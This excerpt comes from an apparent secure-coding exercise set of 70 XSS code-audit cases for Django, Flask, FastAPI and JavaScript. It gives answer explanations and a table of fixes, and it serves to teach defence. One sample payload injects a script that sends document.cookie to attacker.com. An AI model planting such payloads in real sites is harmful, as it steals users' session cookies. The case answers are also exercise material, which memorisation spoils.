...
Star SecEng-Exercises on GitHub ⭐
{% endcta %}
...
Below are **70 code audit cases**. Each presents a realistic web application snippet — Django, Flask, FastAPI, vanilla JavaScript, or React — containing zero, one, or two security bugs related to XSS.
...
1. Stored XSS. Missing Escaping for the `sponsor_html` argument passed to `format_html()`.

2. Sample payload:

```
sponsor_name: </p><script>fetch('https://attacker.com/?q='+document.cookie);</script><p>
```
...
1. Stored XSS. Wrong Context Escaping. Unnecessary enclosing of `{{ author | tojson }}` in double quotes since `tojson` does this automatically. Remember `tojson` is used for Javascript-context escaping in popular frameworks such as Flask and FastAPI. Even after removing the enclosed doubled quotes the `innerHTML` in the frontend template still leaves the code vulnerable to XSS. So the `innerHTML` has to be replaced with escaped HTML content.
...
1. Stored XSS. Missing escaping for `bio_preview`. The `mark_safe()` tells Django that `bio_preview` is safe for HTML execution provided the input is larger than 100 characters (Why would the developer do that?).
...
1. Stored XSS. Wrong Context Escaping in initialization of `title`. Also Missing Escaping for DOM sink in both `renderHeader()` and `renderTags()`.
...
1. No XSS vulnerability. HTML escaping `escape(body)` at storage time causes double-escaping display issues in the HTML template and corrupts data delivered through the JSON API.
...
| 61 | Django | Stored | Missing (`mark_safe()` in model method) | HTML body | Return raw string from `get_username_display()` |
| 62 | Django | Stored | Wrong context | JS string + `innerHTML` sink | Remove `escape()`; `\| escapejs` + `createElement` + `textContent` |
| 63 | Flask | Stored | Missing (`Markup(x)` in utility function) | HTML body | Delete utility function; pass raw model objects; let Jinja2 autoescape |
| 64 | Django | Stored | Wrong context (two layers) | JS string + `innerHTML` + inline `onclick` | `\| escapejs` + `createElement` + `addEventListener` |
| 65 | Django | Stored | Missing (`format_html()` + f-string) | HTML body | Delete `format_html()`; pass raw object; move HTML to template |
| 66 | Django | Stored | Missing (`mark_safe()` arg to `format_html()`) | HTML body | Delete `format_html()` + `mark_safe()`; pass raw fields |
| 67 | Flask | Stored | Wrong context (double-quoted `tojson`) + Missing (`innerHTML`) | JS string + `innerHTML` sink | Remove outer quotes; `\| tojson`; `createElement` + `textContent` + `createTextNode` |
| 68 | Django | Stored | Missing (`mark_safe()` on `bio_preview`) | HTML body | Delete `format_html()` + `mark_safe()`; pass raw fields; move `<em>` to template |
| 69 | FastAPI | Stored | Wrong context (double-quoted `tojson`) + Missing (`innerHTML` ×2) | JS string + two `innerHTML` sinks | Remove outer quotes; `createElement` + `textContent` in both render functions |
| 70 | Django | None | Display only (double-escape at storage + corrupted JSON API) | — | Remove `escape()`; store raw; let Django autoescape at render |
